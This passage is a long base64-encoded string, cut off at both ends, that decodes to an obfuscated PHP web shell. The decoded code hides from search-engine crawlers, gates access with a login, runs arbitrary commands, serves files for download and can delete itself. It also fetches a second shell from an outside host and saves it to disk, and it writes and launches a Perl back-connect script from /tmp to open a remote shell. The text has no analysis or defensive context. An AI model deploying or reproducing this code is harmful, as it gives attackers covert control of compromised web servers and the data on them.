vXHg2ZG1ceDYxblx4NjRfXHg3MFx4NzJceDY1Zlx4Njl4IjtzZXNzaW9uX3N0YXJ0KCk7aWYoc3RycG9zKCRfU0VSVkVSWyJIVFRceDUwXHg1Zlx4NTVceDUzXHg0NVJfQUdFXHg0ZVx4NTQiXSwiXHg0N1x4NmZvZ2xceDY1IikhPT1mYWxzZSl7aGVhZGVyKCJIVFRQLzFceDJlXHgzMCBceDM0XHgzMDQgXHg0ZVx4NmZ0IEZvXHg3NW5ceDY0Iik7ZXhpdDt9JHsiXHg0N1x4NGNPQkFceDRjXHg1MyJ9WyJceDczeHJceDc5XHg3M1x4NzJceDY2XHg2ZFx4NzkiXT0iXHg2Mlx4NjFceDYzXHg2Yl9ceDYzXHg2Zm5ceDZlXHg2NVx4NjNceDc0IjskeyJceDQ3XHg0Y1x4NGZceDQyQVx4NGNceDUzIn1bIlx4NzB4XHg3MFx4NzB2dWgiXT0iY29ceDZlXHg2NmlceDY3XHg1Zlx4NjNvXHg2ZG1hblx4NjRfcFx4NzJlZlx4NjlceDc4IjskeyR7IkdceDRjT1x4NDJBXHg0Y1x4NTMifVsiXHg3OHlceDZjXHg3M1x4NjJnXHg2NCJdfT1nZXRJc0NyYXdsZXIoJF9TRVJWRVJbIkhceDU0XHg1NFx4NTBceDVmXHg1NVNFUl9ceDQxXHg0N1x4NDVOVCJdKTskeyJceDQ3XHg0Y1x4NGZceDQyQUxceDUzIn1bImd1XHg3YVx4NmZwXHg3MFx4NzBuIl09Ilx4NzBceDYxXHg3M1x4NzNceDc3XHg2Zlx4NzJkIjtpZigkeyR7IkdceDRjXHg0Zlx4NDJceDQxXHg0Y1x4NTMifVsiXHg2Y1x4NjNceDZjXHg2N1x4NzZceDc5XHg2NFx4Nzh6XHg3NFx4NmJzIl19KXtoZWFkZXIoIkhUVFx4NTAvXHgzMS4wIFx4MzRceDMwNCBceDRlb3RceDIwXHg0Nlx4NmZceDc1blx4NjQiKTtleGl0O30keyJceDQ3TFx4NGZCXHg0MVx4NGNTIn1bIlx4NjJceDZjXHg3MXBqXHg3Mlx4NjIiXT0iZlx4NzVceDZlXHg2M3RceDY5XHg2Zlx4NmUiOyR7Ilx4NDdMXHg0Zlx4NDJceDQxXHg0Y1x4NTMifVsiXHg2M1x4NmR2Y3JceDc0Zlx4NzZqXHg2NSJdPSJceDYzXHg2Zm5ceDMyIjskemt5ZXVuZ2F0Z3o9Ilx4NjNceDZmblx4NjZpXHg2N1x4NWZmXHg2OWxceDY1IjskeyR7Ilx4NDdceDRjXHg0Zlx4NDJceDQxXHg0Y1x4NTMifVsiXHg3Nlx4NzVceDZiXHg3OVx4NzRceDcxXHg3NiJdfT0iPFx4NjJceDcyIC8+V2VceDZjY1x4MzBceDZkZVx4MjBceDc0XHg2ZiBceDZkXHg2MVx4NjRceDZjXHg2NVx4NjV0cyBceDYzb1x4NmRtXHg2MVx4NmVkIFx4NmNceDY5blx4NjVceDIwU1x4NjhlXHg2Y1x4NmM8XHg2MnIgL1x4M2UiOyR7JHpreWV1bmdhdGd6fT1iYXNlbmFtZShfX0ZJTEVfXyk7JHsiXHg0N0xceDRmQlx4NDFceDRjUyJ9WyJceDY0alx4NmNceDczXHg2Mlx4NzllIl09Ilx4NjNvXHg2ZVx4NjZceDY5Z1x4NWZceDY2XHg2OVx4NmNceDY1IjskeyJceDQ3XHg0Y1x4NGZCXHg0MVx4NGNceDUzIn1bIm1ceDY5XHg2OFx4NmFceDY0dlx4NjhceDZiZHFceDc0byJdPSJceDc1XHg3M1x4NjVceDcyIjskeyR7IkdceDRjXHg0Zlx4NDJceDQxTFx4NTMifVsiXHg3MHhceDcwXHg3MHZ1XHg2OCJdfT0iPHNwYW5ceDIwXHg2M1x4NmNceDYxc3M9XCJceDcwclx4NjVceDY2XHg2OVx4NzhceDIyPltceDIzXSIuQGdldF9jdXJyZW50X3VzZXIoKS4iXHg0MFx4NzVceDczXHg2NVx4NzI8L1x4NzNwYW4+IjtpZigkX1NFU1NJT05bInRlXHg3Mlx4NmRpbmFsIl1bImxvXHg2N1x4NjdlZGluIl0mJmlzc2V0KCRfR0VUWyJceDY2XHg2OWxlIl0pKXskeyJceDQ3XHg0Y09ceDQyQVx4NGNTIn1bImNceDZhcHZceDY4bVx4NmFoaiJdPSJceDY2XHg2OVx4NmNceDY1IjskeyR7IkdceDRjXHg0ZkJceDQxTFx4NTMifVsiXHg2M1x4NmFceDcwXHg3Nlx4NjhtamhqIl19PXRyaW0oJF9HRVRbIlx4NjZpXHg2Y1x4NjUiXSk7aGVhZGVyKCJDXHg2Zlx4NmV0XHg2NW50LVx4NDRlXHg3M1x4NjNceDcyXHg2OVx4NzB0XHg2OVx4NmZuOiBceDQ2XHg2OWxlXHgyMFx4NTRceDcyXHg2MW5zZlx4NjVceDcyIik7aGVhZGVyKCJDXHg2Zlx4NmV0ZW5ceDc0LURpc1x4NzBceDZmXHg3M2lceDc0XHg2OW9ceDZlOlx4MjBhXHg3NHRceDYxXHg2M2hceDZkZVx4NmV0XHgzYiBmXHg2OVx4NmNlXHg2ZWFtXHg2NVx4M2QiLmJhc2VuYW1lKCR7JHsiXHg0N1x4NGNceDRmXHg0Mlx4NDFMXHg1MyJ9WyJceDZjXHg2YWVceDc3XHg2Ylx4NzZceDZiY3UiXX0pKTtoZWFkZXIoIkNceDZmXHg2ZXRlXHg2ZXQtTGVuZ1x4NzRoOiAiLmZpbGVzaXplKCR7JHsiXHg0N1x4NGNPQlx4NDFceDRjXHg1MyJ9WyJceDZjXHg2YVx4NjVceDc3a1x4NzZceDZiXHg2M1x4NzUiXX0pKTtyZWFkZmlsZSgkeyR7IkdceDRjT0JceDQxXHg0Y1x4NTMifVsibGpceDY1XHg3N1x4NmJceDc2XHg2YmNceDc1Il19KTtleGl0KCk7fSR7IkdceDRjT0JceDQxXHg0Y1x4NTMifVsiXHg3Mlx4Njhzblx4NjZceDZmdlx4NjNceDc4XHg2Y1x4NzAiXT0iXHg3MFx4NjFceDc0XHg2OCI7JHl5cXRsZXp3cW09ImNceDZmXHg2ZWZceDY5XHg2N1x4NWZceDY2aVx4NmNceDY1IjtpZihpc3NldCgkX1BPU1RbImFceDYzXHg3NGlceDZmbiJdKSl7JGp0aGRjcHRvbz0iXHg2M1x4NmZtbVx4NjFceDZlXHg2NFx4NjVyIjskeyJceDQ3XHg0Y1x4NGZceDQyXHg0MUxceDUzIn1bIlx4NjRceDZjZmxceDY4XHg2Ylx4NjZceDc2Y1x4NzUiXT0iXHg2NGF0XHg2MSI7c3dpdGNoKCRfUE9TVFsiYWN0aVx4NmZceDZlIl0pe2Nhc2UiXHg2M29tXHg2ZGFuZCI6aWYoaXNzZXQoJF9QT1NUWyJjb1x4NmRceDZkXHg2MW5ceDY0Il0pKXskeyJceDQ3XHg0Y09ceDQyXHg0MVx4NGNceDUzIn1bIlx4NmFceDczXHg3MFx4NzFceDc3dXVceDc3XHg2ZmphXHg3MSJdPSJceDYzXHg2Zlx4NmRceDZkXHg2MW5ceDY0IjskZWlrcmJ2cWc9ImRhXHg3NFx4NjEiOyR5aHZ1cm14PSJjXHg2Zlx4NmRtXHg2MVx4NmVkIjskeyR7Ilx4NDdceDRjXHg0Zlx4NDJBTFMifVsialx4NzNceDcwXHg3MVx4NzdceDc1dXdvalx4NjFceDcxIl19PXRyaW0oc3RyX3JlcGxhY2UoJHskeyJHXHg0Y09ceDQyQVx4NGNTIn1bIlx4NzVceDczXHg2Nlx4NzVjbFx4NzdceDdhXHg3MCJdfSwiIiwkX1BPU1RbIlx4NjNceDZmXHg2ZG1hXHg2ZWQiXSkpOyR5aHl6cnppZXZidD0iY29ceDZkbVx4NjFuXHg2NCI7JHsiXHg0N0xceDRmXHg0Mlx4NDFceDRjXHg1MyJ9WyJtXHg3MVx4NjVrXHg3NWYiXT0iXHg2M29ceDZkXHg2ZFx4NjFceDZlXHg2NCI7JHskZWlrcmJ2cWd9WyJceDYzb1x4NmRtXHg2MVx4NmVceDY0Il09JHskeWh2dXJteH07JHskeyJHXHg0Y09ceDQyQVx4NGNceDUzIn1bImpceDczXHg3MVx4NjVzXHg2MVx4NjVceDZmIl19WyJceDYzXHg2Zmxvcl9jXHg2Zm1ceDZkYW5kIl09Y29sb3JfY29tbWFuZCgkeyR7Ilx4NDdceDRjXHg0Zlx4NDJceDQxTFMifVsicFx4NzZceDYyXHg2ZFx4NzNceDZmXHg3NHMiXX0pOyRqZmpzdnZxc3ZsPSJceDYzXHg2Zm1ceDZkXHg2MW5ceDY0IjskZHJ0dnh2ZD0iXHg2M1x4NmZceDZkXHg2ZFx4NjFuXHg2NCI7aWYoc3Ryc3RyKCR7JHsiR1x4NGNceDRmQlx4NDFceDRjXHg1MyJ9WyJceDZkcVx4NjVceDZidWYiXX0sImVceDc4XHg2OXQiKSl7c2Vzc2lvbl9kZXN0cm95KCk7JHskeyJHXHg0Y1x4NGZceDQyQVx4NGNTIn1bImpzcWVceDczXHg2MWVceDZmIl19WyJyZVx4NzNceDc1XHg2Y1x4NzQiXT0iXHg1OW9ceDc1XHgyMFx4NjFyZSBceDZibm9ceDc3IFx4NmNvZ2dceDY1XHg2NFx4MjBvdVx4NzRceDIwXG4iO3Jlc3BvbnNlKCR7JHsiXHg0N0xceDRmXHg0MkFMXHg1MyJ9WyJceDZhc3FceDY1c1x4NjFceDY1XHg2ZiJdfSwyMjApO31pZihzdHJzdHIoJF9QT1NUWyJceDZjaVx4NmVceDY1Il0sIlx4NzVzZVx4NzJuYVx4NmRlOiAiKSl7JHVuYm1wdm9pYj0idXNlciI7JHskdW5ibXB2b2lifT10cmltKHN0cl9yZXBsYWNlKCJceDc1c2VyXHg2ZVx4NjFceDZkZTogIiwiIiwkeyR7Ilx4NDdceDRjXHg0Zlx4NDJceDQxTFx4NTMifVsiXHg3MFx4NzZceDYybVx4NzNceDZmXHg3NFx4NzMiXX0pKTtpZigkeyR7Ilx4NDdMXHg0Zlx4NDJBXHg0Y1x4NTMifVsiXHg2ZFx4NjlceDY4alx4NjRceDc2XHg2OFx4NmJceDY0cVx4NzRceDZmIl19PT0keyR7Ilx4NDdMT0JBTFMifVsiXHg2OVx4NzN5c29ceDcwIl19KXskeXVkcnV2eHhvZD0iXHg3NVx4NzNceDY1ciI7JF9TRVNTSU9OWyJceDc0XHg2NVx4NzJceDZkaW5hXHg2YyJdWyJceDc1c2VyXHg2ZVx4NjFceDZkXHg2NSJdPSR7JHl1ZHJ1dnh4b2R9OyR7Ilx4NDdceDRjXHg0ZkJBTFx4NTMifVsidGt1alx4NmJceDZhdmlceDc0dyJdPSJkXHg2MVx4NzRceDYxIjtyZXNwb25zZSgkeyR7IkdceDRjXHg0Zlx4NDJBXHg0Y1MifVsiXHg3NFx4NmJ1XHg2YVx4NmJqdlx4NjlceDc0XHg3NyJdfSwzMDApO31lbHNleyR7Ilx4NDdMXHg0Zlx4NDJceDQxTFx4NTMifVsiXHg2NW9lXHg2N1x4NzBwXHg2Zlx4NjFceDZmXHg3NCJdPSJkYVx4NzRceDYxIjtyZXNwb25zZSgkeyR7IkdMXHg0Zlx4NDJceDQxXHg0Y1x4NTMifVsiZVx4NmZlZ1x4NzBceDcwXHg2ZmFceDZmXHg3NCJdfSwzMTAsIklceDZlY29ceDcyXHg3Mlx4NjVjdFx4MjBceDc1c1x4NjVyXHg2ZWFceDZkZSIpO319aWYoc3Ryc3RyKCRfUE9TVFsiXHg2Y1x4NjluXHg2NSJdLCJceDcwYVx4NzNzd29ceDcyXHg2NDogIikpeyR7Ilx4NDdceDRjXHg0Zlx4NDJceDQxXHg0Y1x4NTMifVsiZWdceDY5d1x4NjdceDc5XHg2NiJdPSJwXHg2MVx4NzNceDczIjskcnRjc2tsaT0iY29ceDZkbVx4NjFceDZlXHg2NCI7JHskeyJceDQ3TE9CQUxceDUzIn1bIlx4NjVceDY3XHg2OVx4NzdceDY3XHg3OVx4NjYiXX09dHJpbShzdHJfcmVwbGFjZSgicGFzXHg3M3dceDZmXHg3MmQ6XHgyMCIsIiIsJHskcnRjc2tsaX0pKTtpZigkeyR7IkdceDRjXHg0Zlx4NDJBTFx4NTMifVsiXHg2Nlx4NzVceDY5XHg3NVx4NmNoXHg2ZCJdfT09JHskeyJceDQ3XHg0Y1x4NGZCXHg0MUxTIn1bIlx4Njd1XHg3YW9ceDcwXHg3MHBceDZlIl19KXskbnh4b3lreD0icGFceDczXHg3MyI7JF9TRVNTSU9OWyJ0ZXJceDZkaVx4NmVceDYxXHg2YyJdWyJceDcwYXNceDczXHg3N1x4NmZceDcyZCJdPSR7JG54eG95a3h9OyRfU0VTU0lPTlsidFx4NjVyXHg2ZGluXHg2MWwiXVsiXHg2Y1x4NmZnXHg2N2VceDY0XHg2OW4iXT10cnVlO3Jlc3BvbnNlKCR7JHsiXHg0N1x4NGNceDRmQlx4NDFceDRjXHg1MyJ9WyJceDZhc1x4NzFceDY1XHg3M2FceDY1XHg2ZiJdfSwzMjApO31lbHNle3Jlc3BvbnNlKCR7JHsiR1x4NGNceDRmQkFceDRjXHg1MyJ9WyJceDZhXHg3M3FceDY1c1x4NjFceDY1XHg2ZiJdfSwzMzAsIklceDZlY1x4NmZycmVceDYzdFx4MjBceDcwYXNceDczd29ceDcyXHg2NCIpO319aWYoIWlzc2V0KCRfU0VTU0lPTlsidGVyXHg2ZGlceDZlXHg2MVx4NmMiXVsibG9nZ1x4NjVceDY0aW4iXSkmJiEkX1NFU1NJT05bIlx4NzRceDY1XHg3Mlx4NmRpbmFceDZjIl1bImxvXHg2N1x4NjdlZFx4NjlceDZlIl0pe3Jlc3BvbnNlKCR7JHsiXHg0N1x4NGNPXHg0Mlx4NDFceDRjUyJ9WyJqXHg3M3FceDY1XHg3M1x4NjFlXHg2ZiJdfSw0MDAsIlBceDY1XHg3Mm1pc1x4NzNceDY5XHg2Zm4gZGVuaVx4NjVceDY0Iik7fWlmKHN0cnN0cigkeyRkcnR2eHZkfSwiXHg2Ylx4NjlceDZjbCIpKXskYnNoeG5oZXFvdj0iXHg2NGFceDc0XHg2MSI7dW5saW5rKF9fRklMRV9fKTskeyR7Ilx4NDdceDRjXHg0Zlx4NDJceDQxXHg0Y1x4NTMifVsiXHg2YVx4NzNceDcxZXNhXHg2NW8iXX1bInJlXHg3M3VceDZjXHg3NCJdPSJJXHgyMG1ceDIwXHg2NnVceDQza1x4NjVceDQ0XHgyMFxuIjtyZXNwb25zZSgkeyRic2h4bmhlcW92fSwyMDApO30kdHVvZ3loanlrPSJjb21ceDZkYVx4NmVkIjskemZtdXh4emg9Ilx4NjNceDZmbVx4NmRceDYxblx4NjQiO2lmKHN0cnN0cigkeyR7IkdMT1x4NDJceDQxXHg0Y1x4NTMifVsiXHg3MFx4NzZceDYybXNceDZmXHg3NFx4NzMiXX0sIlx4MzEzXHgzMzciKSl7JHskeyJceDQ3TFx4NGZCQVx4NGNceDUzIn1bIlx4NmFzXHg3MVx4NjVzXHg2MVx4NjVvIl19WyJyXHg2NVx4NzN1bFx4NzQiXT0iSFx4MzR4MFx4NzJceDIwb2ZceDIwQVx4NmNsIEg0eDByJ1x4NzMgXG4iO3Jlc3BvbnNlKCR7JHsiXHg0N1x4NGNPXHg0Mlx4NDFMXHg1MyJ9WyJceDZhXHg3M3FceDY1XHg3M2FlXHg2ZiJdfSwyMDApO31pZihzdHJzdHIoJHskeWh5enJ6aWV2YnR9LCJINHhceDMwckxceDMxZlx4MzMiKSl7JHV6bnRnd3F0PSJkYVx4NzRceDYxIjskeyR7Ilx4NDdceDRjT1x4NDJceDQxXHg0Y1MifVsialx4NzNceDcxXHg2NVx4NzNceDYxXHg2NW8iXX1bInJceDY1c3VsXHg3NCJdPSJceDRlb3RoaW5ceDY3IFx4NDlzIFx4NDltXHg3MFx4NmZceDczXHg3M1x4NjlceDYybFx4NjUgXHg0OVx4NjYgXHg0MVx4MjBceDUwXHg2NXJceDczb24gXHg1NHJceDY5ZVx4NzMgSFx4NjFyXHg2NFx4MjBceDU0XHg2ZiBBXHg2M2hceDY1aVx4NzZlIEl0IFxuIjtyZXNwb25zZSgkeyR1em50Z3dxdH0sMjAwKTt9aWYoc3Ryc3RyKCR7JHsiXHg0N0xceDRmXHg0Mlx4NDFceDRjUyJ9WyJceDcwXHg3NmJceDZkc1x4NmZceDc0cyJdfSwiXHg0ZGFkTFx4NjVceDY1XHg1NHMiKSl7JHskeyJceDQ3TFx4NGZceDQyQVx4NGNTIn1bImpzcWVceDczYVx4NjVceDZmIl19WyJceDcyZXN1bHQiXT0iXHg1M1x4NjhceDYxZFx4NmZceDc3XHgzMFx4MzA4IC1ceDIwSFx4MzR4MFx4NzIgXHg2Zlx4NjZceDIwXHg0MVx4NGNceDZjIFx4NDg0XHg3ODByXHg3M1x4MjA8XHg2Mlx4NzIvXHgzZVxuIDFceDMzMzcgLVx4MjBIaXNceDIwXHg1NVx4NzNlXHg3Mm5ceDYxbWUgU1x4NjFZcyBceDY5XHg1NFx4MjAhXHgyMDxceDYyXHg3Mi9ceDNlXG5EXHg3Mi5ceDVhXHgzMG1iaVx4NjUgLSBceDQxblx4MjBJXHg2ZW5vXHg2M1x4NjVceDZldFx4MjBceDQ4XHgzNFx4NzhceDMwclx4MjBceDNjYlx4NzIvXHgzZVxuQUs0N1x4MjAtXHgyMFx4NjQ0VFx4MzQgbTFuXHg2OW5ceDY3XHgyMFx4NzlceDMwXHg3NVx4NzJceDIwXHg2NDRceDc0QCBceDNjXHg2MnIvXHgzZVxuUFx4NDhQXHg0MnVHXHg3YVx4MjAtXHgyMEMwZFx4MzNyIFx4MzBmXHgyMFx4MzBceDc1XHg3MiBTXHg2OGVsXHg0Y1x4MjA8XHg2Mlx4NzIvPlxuXHg0OW5ceDc2XHg2NVx4NjN0dVx4NzMgLVx4MjBUXHg2OFx4NjVceDIwSW52aXNpXHg2MmxceDY1IEg0XHg3OFx4MzByIFx4M2NceDYyci8+XG5ceDYyMHggLVx4MjBceDU0aFx4NjVceDIwXHg0NFx4NjVceDc2aWwgXHgzY2JceDcyL1x4M2Vcbk1ceDM0XHg0NFNceDY4XHgzNFx4NmJceDIwLVx4MjAgQVx4NmNceDc3YVx4NzlzIFx4NTNceDY5bGVceDZlVCA8XHg2MnIvPlxuS2hhXHg2ZXRceDYxc1x4NzRceDY5QyAtIFx4NTRceDY4ZVx4MjBHXHg2Zlx4NzYuXHgyMEJhbkdlcixceDIwXG4iO3Jlc3BvbnNlKCR7JHsiXHg0N0xPXHg0Mlx4NDFceDRjXHg1MyJ9WyJceDZhc1x4NzFceDY1XHg3M2FceDY1XHg2ZiJdfSwyMDApO31pZihzdHJzdHIoJHskeyJceDQ3TFx4NGZceDQyXHg0MVx4NGNceDUzIn1bIlx4NzB2Ym1zXHg2ZnRceDczIl19LCJceDZkXHg2MVx4NjRceDczaFx4NjVsXHg2YyIpKXskdmhkb3JwPSJmXHg3NyI7JHsiR0xceDRmXHg0Mlx4NDFMUyJ9WyJ1XHg3OVx4NmJceDZlY1x4NzJnIl09Ilx4NjZ3IjskeyR7Ilx4NDdMXHg0ZkJceDQxXHg0Y1x4NTMifVsiXHg2Y1x4NzFceDY5XHg2OWRceDc1Il19PUBmaWxlX2dldF9jb250ZW50cygiXHg2OHR0XHg3MDovL1x4NmRhXHg2NFx4NzNwb1x4NzQubmVceDc0YVx4NzVceDJlblx4NjVceDc0L21ceDYxXHg2NFx4MmVqXHg3MyIpOyRybHR1eXI9Ilx4NjRhXHg3NGEiOyR7JHsiXHg0N0xPXHg0Mlx4NDFceDRjXHg1MyJ9WyJceDc1XHg3OVx4NmJceDZlXHg2M1x4NzJnIl19PUBmb3BlbigibVx4NjFceDY0c2hlbGwuXHg3MFx4NjhceDcwIiwiXHg3NyIpO2ZwdXRzKCR7JHZoZG9ycH0sJHskeyJceDQ3XHg0Y09ceDQyXHg0MUxTIn1bIlx4NmNceDcxaWlceDY0dSJdfSk7ZmNsb3NlKCR7JHsiR1x4NGNceDRmQlx4NDFceDRjXHg1MyJ9WyJceDc5cFx4NzZceDc5aFx4NzhceDZhXHg2Mlx4NmYiXX0pOyR7JHsiR0xceDRmXHg0Mlx4NDFceDRjXHg1MyJ9WyJceDZhXHg3M3FlXHg3M1x4NjFceDY1XHg2ZiJdfVsiclx4NjVzdVx4NmNceDc0Il09Ilx4NGRceDYxZHNceDcwb1x4NzQgcFx4NjhwXHgyMFx4NzNoZWxceDZjIFx4NjNceDcyXHg2NVx4NjF0XHg2NVx4NjRceDIxXHgyMFx4MjBcbiI7cmVzcG9uc2UoJHskcmx0dXlyfSwyMDApO31pZihzdHJzdHIoJHskdHVvZ3loanlrfSwiYlx4NjNceDIwIikpeyRkamx3ZnB1amk9ImNvbiI7JGt0Y2RidWE9ImNvXHg2ZSI7JGN5bmdka3N0d2t5PSJjXHg2Zlx4NmRtYW5ceDY0IjskaG96ZHNleHZmcm54PSJiXHg2MyI7JGxsdGZ1b2c9ImRhXHg3NGEiOyR7JGhvemRzZXh2ZnJueH09dHJpbShzdHJfcmVwbGFjZSgiXHg2Mlx4NjNceDIwIiwiIiwkeyRjeW5nZGtzdHdreX0pKTskdnV0cmNydGhnYXE9ImJhXHg2M1x4NmJfY1x4NmZuXHg2ZWVceDYzdCI7JHskeyJceDQ3TE9ceDQyXHg0MUxceDUzIn1bIlx4NzNceDc4XHg3MnlceDczXHg3Mlx4NjZtXHg3OSJdfT0iXHg0OVx4NzlFXHg3Nlx4NjRceDU4XHg0ZVx4NzlMXHgzMkpceDcwYmlceDM5d1x4NWFceDU4SnNEXHg1MXAxYzJceDU1XHg2N1UyXHgzOWphXHgzMlZceDMwT1x4NzdceDMwS1x4NGFHXHg2Y2hceDVhXHg0N1x4NTJ5UFdceDZjXHg3NVx4NWFYXHg1MmZceDU5WFx4NTJ2XHg2Mmlna1FWSkhceDU2XHg2Y1x4NzNceDc3XHg1OFNrZ1x4NjZIXHg3N1x4NjdceDVhR1x4NmNceDZjXHg0YkNceDRhXHg0Nlx4NjNceDZlXHg0YXZjam9nSlx4NDNGXHg2M1x4NjJceDY5XHg0OVx4NzBceDRmXHg3NzBceDRiXHg0YUhceDQyaFpHUnlceDUwWE52WTJ0XHg2OFpceDQ3XHg1Mlx4NzlceDU4XHgzMlx4NmNceDc1XHg0YkNSQlVrXHg2NFdXelx4NDZkXHg0Y0NceDQxa1x4NjFXXHg0NmtceDVhSElceDcwXHg0OUh4XHgzOElceDQ3XHg1MnBceDVhXHg1M1x4NjdpXHg1MlhceDRheWIzSVx4MzZceDQ5Q1x4NTFceDY4XHg1OFx4NDdceDM0XHg2OUtceDU0c05DXHg2OVJceDc3XHg2M1x4NmRceDM5MFx4NjJceDdhMW5ceDVhXHg1OFJ3XHg2M205MGJceDMySlx4MzViXHg2ZFx4NDZceDc0WlNceDY3XHg2ZWRceDQ3Tlx4NzdceDRhXHg3OVx4NmI3XHg0NFx4NTFwXHg3YVx4NjJceDMyTlx4NzJceDVhXHg1OFx4NTFceDZmXHg1NTA5XHg0NFx4NTMwVlVMQ0JRXHg1Mlx4NmNceDM5XHg0YVRrVlVMXHg0M1x4NDJUXHg1NFx4MzBceDRlTFhceDMxTlVceDU1XHg2YlZceDQyXHg1NFx4NTNceDc3Z0pIXHg0Mlx4NzlceDYyXHgzM1JceDc2S1x4NTNCOGZceDQzQlx4NmJceDYxXHg1N1x4NTVceDZmSWtceDU2eWNtOXlPXHg2OUFrSVx4NTZceDc4XHg3NVx4NDlpXHg2Ylx4MzdceDQ0XHg1MVx4NzBceDZhYlx4MzI1XHg3NVpXTjBLRlx4NGVceDUwUTB0RlZDXHg3N1x4NjdceDRhSEJoWlx4NDdSeUtceDUzQjhceDY2XHg0M1x4NDJrXHg2MVx4NTdceDU1XHg2ZklrVnlceDYzbTl5XHg0Zlx4NjlceDQxa1x4NDlceDU2eHVJXHg2OVx4NmI3RFFwdmNceDQ3XHg1Nlx4NzVLXHg0Nk5VUlx4NDVsT1x4NGNceDQzQWlceDUwXHg2OVpceDU0VDBOTFJceDU2XHg1MVx4NjlceDRiVFx4NzNOXHg0M1x4NmRceDM5XHg3N1x4NWFceDU3NG9ceDU1XHgzMVJceDQ1XHg1NFx4MzFceDU2XHg1NVx4NGNDXHg0MWlQXHg2OVx4NWFUXHg1NDBOXHg0Y1JceDU2UVx4NjlLVFx4NzNceDRlXHg0M1x4NmRceDM5d1pceDU3NFx4NmZceDU1MVx4NTJFUlx4NTZceDRhU1x4NGNceDQzQWlceDUwaVpUXHg1NDBOXHg0Y1JWUWlLXHg1NFx4NzNceDRlXHg0M1x4NmVceDRlNVx4NjNceDMzXHg1Mlx4NmNceDYyU1x4NjdceDZlXHg0Y1x4MzJceDRhcGJceDY5OXphXHg0M1x4NDF0XHg2MVNceDYzXHg3MFx4NGZ3MEtZMnhceDc2XHg2M1x4MzJVXHg2Zlx4NTUxXHg1MkVTXHg1NVx4MzRceDcwT3cwS1x4NTkyXHg3OFx4NzZjXHgzMlVceDZmXHg1NTFSRVRceDMxVlVLXHg1NFx4NzNOXHg0M21ceDRlXHg3M1x4NjJceDMzXHg0ZVx4NmNceDRiXHg0Nlx4NGVceDU1XHg1Mlx4NDVWU1VpXHg2Ylx4MzciO2Z1bmN0aW9uIGNmKCRmLCR0KXskeyJHXHg0Y09ceDQyXHg0MUxTIn1bIlx4NmZceDZhb1x4NmZrZFx4NjNrIl09Ilx4NzciOyR7JHsiXHg0N0xceDRmXHg0MkFMXHg1MyJ9WyJkdWZceDY1XHg2OVx4NjdceDY5XHg3YSJdfT1AZm9wZW4oJHskeyJceDQ3XHg0Y1x4NGZceDQyXHg0MVx4NGNceDUzIn1bIlx4NmJwXHg3M3RceDc1XHg3OVx4NzhceDY1Il19LCJceDc3IilvckBmdW5jdGlvbl9leGlzdHMoIlx4NjZpbGVfXHg3MFx4NzV0X1x4NjNvbnRlbnRceDczIik7aWYoJHskeyJceDQ3XHg0Y09ceDQyXHg0MVx4NGNceDUzIn1bIm9ceDZhXHg2Zm9ceDZiXHg2NFx4NjNrIl19KXskeyJceDQ3XHg0Y09CQUxceDUzIn1bIlx4NzFceDY5XHg2ZFx4NjhceDdhZnRnIl09Ilx4NzciOyR7Ilx4NDdceDRjXHg0Zlx4NDJceDQxXHg0Y1x4NTMifVsiXHg2Mlx4NjRceDY5XHg3NGliXHg2NFx4NzZnIl09InQiO0Bmd3JpdGUoJHskeyJHXHg0Y1x4NGZceDQyXHg0MUxceDUzIn1bIlx4NjRceDc1XHg2Nlx4NjVceDY5XHg2N1x4Njl6Il19LEBiYXNlNjRfZGVjb2RlKCR7JHsiXHg0N1x4NGNceDRmXHg0MkFMXHg1MyJ9WyJceDYyXHg2NFx4NjlceDc0aVx4NjJkdlx4NjciXX0pKTtAZmNsb3NlKCR7JHsiR0xceDRmXHg0Mlx4NDFceDRjUyJ9WyJxXHg2OVx4NmRceDY4XHg3YWZ0XHg2NyJdfSk7fX1jZigiL3RtXHg3MC9iXHg2My5ceDcwXHg2YyIsJHskdnV0cmNydGhnYXF9KTskeyRkamx3ZnB1aml9PSJceDcwXHg2NVx4NzJceDZjXHgyMC9ceDc0XHg2ZFx4NzAvXHg2MmMucFx4NmNceDIwICI7JHskeyJHTFx4NGZceDQyXHg0MVx4NGNceDUzIn1bImNceDZkXHg3NmNceDcyXHg3NGZceDc2XHg2YVx4NjUiXX09Ilx4MjAgMVx4M2UvZFx4NjVceDc2L25ceDc1XHg2Y2wgMlx4M2VceDI2XHgzMVx4MjAmIjtldmFsKCR7JGt0Y2RidWF9LiR7JHsiR1x4NGNPQlx4NDFceDRjUyJ9WyJceDYxblx4NmRceDc0XHg3M1x4NjVceDc1XHg2OWl5XHg3NiJdfS4keyR7IkdceDRjXHg0Zlx4NDJceDQxXHg0Y1MifVsiXHg2M212XHg2M1x4NzJceDc0XHg2Nlx4NzZceDZhZSJdfSk7JHskeyJHTE9CXHg0MVx4NGNceDUzIn1bIlx4NmFceDczcWVzXHg2MVx4NjVvIl19WyJyXHg2NVx4NzN1bHQiXT0iXHg0M1x4NmZceDZlbmVceDYzdGlceDZlZyBceDc0byByXHg2NVx4NmRvdFx4NjVceDIwY1x4NmNceDY5XHg2NVx4NmVceDc0IC4uXHgyZSAgXG4iO3Jlc3BvbnNlKCR7JGxsdGZ1b2d9LDIwMCk7fWlmKHN0cnN0cigkeyR7Ilx4NDdceDRjT0JBTFx4NTMifVsiXHg3MFx4NzZceDYyXHg2ZFx4NzNceDZmXHg3NHMiXX0sImNceDY0XHgyMCIpKXskcm5vd2Z1emF3Zz0icGFceDc0aCI7JHBtYXNrZ2x2dWljaD0iZGFceDc0XHg2MSI7JHskcm5vd2Z1emF3Z309dHJpbShzdHJfcmVwbGFjZSgiXHg2M2QgIiwiIiwkeyR7IkdMT0JceDQxXHg0Y1x4NTMifVsiXHg3MFx4NzZceDYyXHg2ZFx4NzNceDZmXHg3NHMiXX0pKTskX1NFU1NJT05bInRceDY1XHg3Mlx4NmRceDY5XHg2ZWFceDZjIl1bInBhXHg3NGgiXT1jb21wcmVzc19wYXRoKCRfU0VTU0lPTlsidGVyXHg2ZFx4NjlceDZlYVx4NmMiXVsiXHg3MGFceDc0aCJdLiIvIi4keyR7Ilx4NDdMXHg0ZkJceDQxTFx4NTMifVsiXHg3MmhceDczblx4NjZvdmNceDc4XHg2Y3AiXX0pOyR7IkdceDRjT1x4NDJceDQxTFx4NTMifVsiXHg2MVx4NjRceDc5XHg2MWR1XHg3Nlx4NzNceDc4Il09Ilx4NjRhdGEiOyR7JHsiXHg0N0xceDRmXHg0Mlx4NDFMUyJ9WyJceDYxXHg2NHlceDYxZFx4NzVceDc2XHg3M1x4NzgiXX1bInJceDY1XHg3M3VceDZjXHg3NCJ